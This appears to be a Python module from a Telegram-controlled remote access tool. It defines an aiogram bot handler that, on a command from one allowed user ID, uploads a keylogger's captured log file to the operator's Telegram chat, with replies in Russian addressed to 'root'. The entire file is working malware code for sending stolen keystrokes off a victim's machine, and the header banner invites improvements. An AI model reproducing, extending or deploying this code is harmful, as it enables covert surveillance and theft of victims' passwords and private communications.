##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


import os
from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from lib.System.Key_logger.key_logger_handlers import log_file_path
from config import ALLOWED_USER_ID

def key_logs_handlers(dp):
    @dp.message(F.text.casefold().startswith("key logs [new]"))
    @dp.message(Command("key_logs"))
    async def send_logs(message: types.Message, state: FSMContext):
        if message.from_user.id != ALLOWED_USER_ID:
            return
        if os.path.exists(log_file_path):
            await message.answer("Отправляю логи, root")
            await message.answer_document(types.FSInputFile(log_file_path))
        else:
            await message.answer("Файл логов пока отсутствует, root")